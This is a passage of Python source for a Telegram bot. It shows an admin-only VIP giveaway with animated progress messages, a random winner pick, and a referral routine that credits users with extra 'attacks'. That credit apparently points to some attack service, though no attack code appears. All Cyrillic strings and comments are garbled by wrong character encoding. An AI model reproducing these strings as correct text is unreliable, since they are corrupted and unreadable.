    """–ó–∞–ø—É—Å–∫ —Ä–æ–∑—ã–≥—Ä—ã—à–∞ VIP-—Å—Ç–∞—Ç—É—Å–∞"""
    user_id = callback_query.from_user.id
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ –ø—Ä–∞–≤–∞
    if user_id not in ADMIN:
        await callback_query.answer("üö´ –ù–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∞–≤!", show_alert=True)
        return
    
    # –û—Ç—Ä–∏–º—É—î–º–æ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —á–∞—Ç –∑ inline_message_id –∞–±–æ message
    chat_id = None
    message_id = None
    
    if callback_query.message:
        chat_id = callback_query.message.chat.id
        message_id = callback_query.message.message_id
        chat_type = callback_query.message.chat.type
    elif callback_query.inline_message_id:
        # –î–ª—è inline-–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å –∑–∞–ø—É—Å–∫–∞—î–º–æ –ø–æ–≤–Ω—É –∞–Ω—ñ–º–∞—Ü—ñ—é
        await callback_query.answer("üé∞ –ó–∞–ø—É—Å–∫–∞—é —Ä–æ–∑—ã–≥—Ä—ã—à...")
        
        # –û—Ç—Ä–∏–º—É—î–º–æ —Å–ø–∏—Å–æ–∫ –∞–∫—Ç–∏–≤–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
        async with db_pool.acquire() as conn:
            users = await conn.fetch('SELECT user_id, name, username FROM users WHERE block = 0')
        
        if not users:
            await bot.edit_message_text(
                "‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –¥–ª—è —Ä–æ–∑—ã–≥—Ä—ã—à–∞!",
                inline_message_id=callback_query.inline_message_id
            )
            return
        
        # –§—ñ–ª—å—Ç—Ä—É—î–º–æ –∞–∫—Ç–∏–≤–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
        active_users = []
        for user in users:
            try:
                await bot.send_chat_action(user['user_id'], 'typing')
                active_users.append(user)
            except (BotBlocked, UserDeactivated, ChatNotFound):
                continue
            except Exception:
                continue
        
        if not active_users:
            await bot.edit_message_text(
                "‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –¥–ª—è —Ä–æ–∑—ã–≥—Ä—ã—à–∞!",
                inline_message_id=callback_query.inline_message_id
            )
            return
        
        # –ó–∞–ø—É—Å–∫–∞—î–º–æ –∞–Ω—ñ–º–∞—Ü—ñ—é –¥–ª—è inline-–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
        await run_inline_giveaway_animation(callback_query.inline_message_id, active_users)
        return
    else:
        await callback_query.answer("‚ùå –ü–æ–º–∏–ª–∫–∞: –Ω–µ –≤–¥–∞–ª–æ—Å—è –≤–∏–∑–Ω–∞—á–∏—Ç–∏ —á–∞—Ç!", show_alert=True)
        return
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ —Ü–µ –≥—Ä—É–ø–æ–≤–∏–π —á–∞—Ç
    if chat_type not in ['group', 'supergroup']:
        await callback_query.answer("üö´ –†–æ–∑—ã–≥—Ä—ã—à –¥–æ—Å—Ç—É–ø–µ–Ω —Ç–æ–ª—å–∫–æ –≤ –≥—Ä—É–ø–ø–æ–≤—ã—Ö —á–∞—Ç–∞—Ö!", show_alert=True)
        return
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —á–∏ –Ω–µ –π–¥–µ –≤–∂–µ —Ä–æ–∑—ñ–≥—Ä–∞—à
    if giveaway_flags.get(chat_id):
        await callback_query.answer("‚è≥ –†–æ–∑—ã–≥—Ä—ã—à —É–∂–µ –∏–¥–µ—Ç!", show_alert=True)
        return
    
    await callback_query.answer("üé∞ –ó–∞–ø—É—Å–∫–∞—é —Ä–æ–∑—ã–≥—Ä—ã—à...")
    giveaway_flags[chat_id] = True
    
    try:
        # –û—Ç—Ä–∏–º—É—î–º–æ —Å–ø–∏—Å–æ–∫ –∞–∫—Ç–∏–≤–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
        async with db_pool.acquire() as conn:
            users = await conn.fetch('SELECT user_id, name, username FROM users WHERE block = 0')
        
        if not users:
            await bot.edit_message_text(
                "‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –¥–ª—è —Ä–æ–∑—ã–≥—Ä—ã—à–∞!",
                chat_id=chat_id,
                message_id=message_id
            )
            return
        
        # –§—ñ–ª—å—Ç—Ä—É—î–º–æ –∞–∫—Ç–∏–≤–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ (—Ç–µ—Ö, –∫—Ç–æ –Ω–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–ª –±–æ—Ç–∞)
        active_users = []
        for user in users:
            try:
                await bot.send_chat_action(user['user_id'], 'typing')
                active_users.append(user)
            except (BotBlocked, UserDeactivated, ChatNotFound):
                continue
            except Exception:
                continue
        
        if not active_users:
            await bot.edit_message_text(
                "‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –¥–ª—è —Ä–æ–∑—ã–≥—Ä—ã—à–∞!",
                chat_id=chat_id,
                message_id=message_id
            )
            return
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –∞–Ω–∏–º–∞—Ü–∏—é –ø–æ–∏—Å–∫–∞
        await run_giveaway_animation(chat_id, message_id, active_users)
        
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –≤ —Ä–æ–∑—ã–≥—Ä—ã—à–µ: {e}")
        try:
            await bot.edit_message_text(
                "‚ùå –°—Ç–∞–ª–∞—Å—è –ø–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ–¥–µ–Ω–Ω—ñ —Ä–æ–∑—ñ–≥—Ä–∞—à—É!",
                chat_id=chat_id,
                message_id=message_id
            )
        except Exception as edit_error:
            logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ —Å–æ–æ–±—â–µ–Ω–∏—è: {edit_error}")
            try:
                await bot.send_message(chat_id, "‚ùå –°—Ç–∞–ª–∞—Å—è –ø–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ–¥–µ–Ω–Ω—ñ —Ä–æ–∑—ñ–≥—Ä–∞—à—É!")
            except Exception as send_error:
                logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Å–æ–æ–±—â–µ–Ω–∏—è: {send_error}")
    finally:
        giveaway_flags[chat_id] = False

async def run_giveaway_animation(chat_id: int, message_id: int, active_users: list):
    """–ê–Ω–∏–º–∞—Ü–∏—è —Ä–æ–∑—ã–≥—Ä—ã—à–∞ —Å –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä–æ–º"""
    import random
    
    # –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –¥–ª—è –∞–Ω—ñ–º–∞—Ü—ñ—ó
    search_messages = [
        "üé™ –ü–µ—Ä–µ–º–µ—à–∏–≤–∞—é —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤...",
        "‚ö° –ó–∞–ø—É—Å–∫–∞—é –≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä —Å–ª—É—á–∞–π–Ω—ã—Ö —á–∏—Å–µ–ª...",
        "üé≤ –ö—Ä—É—Ç–∏—Ç—Å—è –∫–æ–ª–µ—Å–æ —Ñ–æ—Ä—Ç—É–Ω—ã...",
        "üéØ –ü–æ—á—Ç–∏ –≥–æ—Ç–æ–≤–æ...",
    ]
    
    total_steps = 4
    step_duration = 3.0  # —Å–µ–∫—É–Ω–¥–∞ –Ω–∞ —à–∞–≥
    
    for step in range(total_steps):
        if not giveaway_flags.get(chat_id):
            return
        
        # –°—Ç–≤–æ—Ä—é—î–º–æ –ø—Ä–æ–≥—Ä–µ—Å-–±–∞—Ä
        filled = (step + 1) * 2
        empty = 8 - filled
        progress_bar = "‚ñì" * filled + "‚ñë" * empty
        percentage = (step + 1) * 25     
        # –í–∏–±–∏—Ä–∞—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
        if step < len(search_messages):
            message = search_messages[step]
        else:
            message = random.choice(search_messages)
        
        # –û–Ω–æ–≤–ª—é—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
        text = f"üéâ <b>–†–æ–∑—ñ–≥—Ä–∞—à VIP-—Å—Ç–∞—Ç—É—Å—É</b>\n\n{message}\n\n[{progress_bar}] {percentage}%\n\nüë• –£—á–∞—Å–Ω–∏–∫—ñ–≤: {len(active_users)}"
        
        try:
            await bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='HTML'
            )
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è –Ω–∞ —à–∞–≥–µ {step}: {e}")
            # –Ø–∫—â–æ –Ω–µ –º–æ–∂–µ–º–æ —Ä–µ–¥–∞–≥—É–≤–∞—Ç–∏, –ø—Ä–æ–ø—É—Å–∫–∞—î–º–æ —Ü–µ–π –∫—Ä–æ–∫
            pass
        
        if step < total_steps:
            await asyncio.sleep(step_duration)
    
    # –í–∏–±–∏—Ä–∞—î–º–æ –ø–µ—Ä–µ–º–æ–∂—Ü—è
    winner = random.choice(active_users)
    winner_name = winner['name'] or "–ë–µ–∑ –∏–º–µ–Ω–∏"
    winner_username = winner['username']
    winner_id = winner['user_id']
    
    # –§–æ—Ä–º—É—î–º–æ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ –ø—Ä–æ—Ñ—ñ–ª—å
    if winner_username:
        profile_link = f"<a href='https://t.me/{winner_username}'>@{winner_username}</a>"
        display_name = f"{winner_name} (@{winner_username})"
    else:
        profile_link = f"<a href='tg://user?id={winner_id}'>{winner_name}</a>"
        display_name = winner_name
    
    # –§—ñ–Ω–∞–ª—å–Ω–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
    final_text = (
        f"üéâ <b>–í—ñ—Ç–∞—î–º–æ –ø–µ—Ä–µ–º–æ–∂—Ü—è!</b>\n\n"
        f"üèÜ –ü–µ—Ä–µ–º–æ–∂–µ—Ü—å —Ä–æ–∑—ñ–≥—Ä–∞—à—É VIP-—Å—Ç–∞—Ç—É—Å—É:\n"
        f"üë§ {profile_link}\n"
        f"üÜî ID: <code>{winner_id}</code>\n\n"
        f"üéä –í—ñ—Ç–∞—î–º–æ –∑ –ø–µ—Ä–µ–º–æ–≥–æ—é!"
    )
    
    try:
        await bot.edit_message_text(
            final_text,
            chat_id=chat_id,
            message_id=message_id,
            parse_mode='HTML'
        )
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ —Ñ–∏–Ω–∞–ª—å–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è: {e}")
        # –Ø–∫—â–æ –Ω–µ –º–æ–∂–µ–º–æ –≤—ñ–¥—Ä–µ–¥–∞–≥—É–≤–∞—Ç–∏, –Ω–∞–¥—Å–∏–ª–∞—î–º–æ –Ω–æ–≤–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
        try:
            await bot.send_message(chat_id, final_text, parse_mode='HTML')
        except Exception as send_error:
            logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–∏–Ω–∞–ª—å–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è: {send_error}")

async def run_inline_giveaway_animation(inline_message_id: str, active_users: list):
    """–ê–Ω–∏–º–∞—Ü–∏—è —Ä–æ–∑—ã–≥—Ä—ã—à–∞ –¥–ª—è inline-—Å–æ–æ–±—â–µ–Ω–∏–π"""
    import random
    
    # –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –¥–ª—è –∞–Ω—ñ–º–∞—Ü—ñ—ó
    search_messages = [
        "üé™ –ü–µ—Ä–µ–º–µ—à–∏–≤–∞—é —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤...",
        "‚ö° –ó–∞–ø—É—Å–∫–∞—é –≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä —Å–ª—É—á–∞–π–Ω—ã—Ö —á–∏—Å–µ–ª...",
        "‚ú® –û–ø—Ä–µ–¥–µ–ª—è—é –ø–æ–±–µ–¥–∏—Ç–µ–ª—è...",
        "üéØ –ü–æ—á—Ç–∏ –≥–æ—Ç–æ–≤–æ...",
    ]
    
    total_steps = 4
    step_duration = 3.0  # —Å–µ–∫—É–Ω–¥–∞ –Ω–∞ —à–∞–≥
    
    for step in range(total_steps):
        # –°—Ç–≤–æ—Ä—é—î–º–æ –ø—Ä–æ–≥—Ä–µ—Å-–±–∞—Ä
        filled = (step + 1) * 2
        empty = 8 - filled
        progress_bar = "‚ñì" * filled + "‚ñë" * empty
        percentage = (step + 1) * 25
        
        # –í–∏–±–∏—Ä–∞—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
        if step < len(search_messages):
            message = search_messages[step]
        else:
            message = random.choice(search_messages)
        
        # –û–Ω–æ–≤–ª—é—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
        text = f"üéâ <b>–†–æ–∑—ñ–≥—Ä–∞—à VIP-—Å—Ç–∞—Ç—É—Å—É</b>\n\n{message}\n\n[{progress_bar}] {percentage}%\n\nüë• –£—á–∞—Å–Ω–∏–∫—ñ–≤: {len(active_users)}"
        
        try:
            await bot.edit_message_text(
                text,
                inline_message_id=inline_message_id,
                parse_mode='HTML'
            )
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è inline-—Å–æ–æ–±—â–µ–Ω–∏—è –Ω–∞ —à–∞–≥–µ {step}: {e}")
            pass
        
        if step < total_steps:
            await asyncio.sleep(step_duration)
    
    # –í–∏–±–∏—Ä–∞—î–º–æ –ø–µ—Ä–µ–º–æ–∂—Ü—è
    winner = random.choice(active_users)
    winner_name = winner['name'] or "–ë–µ–∑ –∏–º–µ–Ω–∏"
    winner_username = winner['username']
    winner_id = winner['user_id']
    
    # –§–æ—Ä–º—É—î–º–æ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ –ø—Ä–æ—Ñ—ñ–ª—å
    if winner_username:
        profile_link = f"<a href='https://t.me/{winner_username}'>@{winner_username}</a>"
    else:
        profile_link = f"<a href='tg://user?id={winner_id}'>{winner_name}</a>"
    
    # –§—ñ–Ω–∞–ª—å–Ω–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
    final_text = (
        f"üéâ <b>–í—ñ—Ç–∞—î–º–æ –ø–µ—Ä–µ–º–æ–∂—Ü—è!</b>\n\n"
        f"üèÜ –ü–µ—Ä–µ–º–æ–∂–µ—Ü—å —Ä–æ–∑—ñ–≥—Ä–∞—à—É VIP-—Å—Ç–∞—Ç—É—Å—É:\n"
        f"üë§ {profile_link}\n"
        f"üÜî ID: <code>{winner_id}</code>\n\n"
        f"üéä –í—ñ—Ç–∞—î–º–æ –∑ –ø–µ—Ä–µ–º–æ–≥–æ—é!"
    )
    
    try:
        await bot.edit_message_text(
            final_text,
            inline_message_id=inline_message_id,
            parse_mode='HTML'
        )
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ —Ñ–∏–Ω–∞–ª—å–Ω–æ–≥–æ inline-—Å–æ–æ–±—â–µ–Ω–∏—è: {e}")

# –î–æ–¥–∞—é —Ñ—É–Ω–∫—Ü—ñ—é –¥–ª—è –Ω–∞—Ä–∞—Ö—É–≤–∞–Ω–Ω—è —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∏—Ö –∞—Ç–∞–∫
async def process_referral(referrer_id, user_id, username, name):
    if not referrer_id:
        return
    async with db_pool.acquire() as conn:
        await conn.execute(
            'INSERT INTO referrals (referrer_id, referred_id) VALUES ($1, $2) ON CONFLICT (referred_id) DO NOTHING',
            referrer_id, user_id
        )
        await conn.execute(
            'UPDATE users SET referral_attacks = referral_attacks + 2, referral_count = referral_count + 1 WHERE user_id = $1',
            referrer_id
        )
        try:
            ref_name = username or name or f"User{user_id}"
            await bot.send_message(
                referrer_id,
                f"üéâ –ó–∞ –≤–∞—à–æ—é —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ—é —Å–∏–ª–∫–æ—é –ø—Ä–∏—î–¥–Ω–∞–≤—Å—è –Ω–æ–≤–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á: <a href='tg://user?id={user_id}'>{ref_name}</a>\nüöÄ –í–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ +2 –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –∞—Ç–∞–∫–∏!",
                parse_mode='HTML'
            )
        except Exception as e:
            logging.error(f"Error notifying referrer {referrer_id}: {e}")

if __name__ == '__main__':
    logging.info("–ó–∞–ø—É—Å–∫ –±–æ—Ç–∞...")
    loop = asyncio.get_event_loop()
    loop.run_until_complete(init_db())
    executor.start_polling(dp, skip_updates=True)
